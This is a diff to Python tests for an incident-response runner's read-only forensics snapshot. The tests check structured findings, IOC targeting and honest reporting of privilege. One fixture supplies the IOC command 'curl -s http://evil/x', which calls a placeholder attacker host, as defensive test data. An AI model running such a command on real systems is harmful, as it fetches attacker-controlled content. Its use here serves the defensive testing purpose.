@@ -43,5 +43,23 @@ def test_armed_but_agent_not_allowed_stays_dry_run():
 def test_snapshot_is_read_only_and_runs():
     out = r.run(_action("snapshot", "web-01", mode="dry_run"), allow_armed=False)
     # read-only playbook executes even without arming
-    assert out["ran"] is True and out["dry_run"] is False
-    assert "processes" in out["stdout"].lower()
+    assert out["ran"] is True and out["dry_run"] is False and out["read_only"] is True
+    # it returns structured forensics, not a text dump of ps aux
+    fx = out["forensics"]
+    assert {"findings", "connections", "persistence", "counts", "root"} <= set(fx)
+    assert isinstance(fx["findings"], list)
+
+
+def test_snapshot_targets_the_incident_iocs():
+    action = _action("snapshot", "web-01")
+    action["params"] = {"ips": ["203.0.113.7"], "commands": ["curl -s http://evil/x"]}
+    fx = r.run(action, allow_armed=False)["forensics"]
+    # the IOCs the incident supplied are what the collection was pointed at
+    assert fx["ioc_ips"] == ["203.0.113.7"]
+
+
+def test_snapshot_reports_privilege_honestly():
+    fx = r.run(_action("snapshot", "web-01"), allow_armed=False)["forensics"]
+    # unprivileged runs must say what they could not read rather than look complete
+    assert fx["root"] is (os.geteuid() == 0)
+    assert fx["degraded"] == [] if fx["root"] else fx["degraded"]
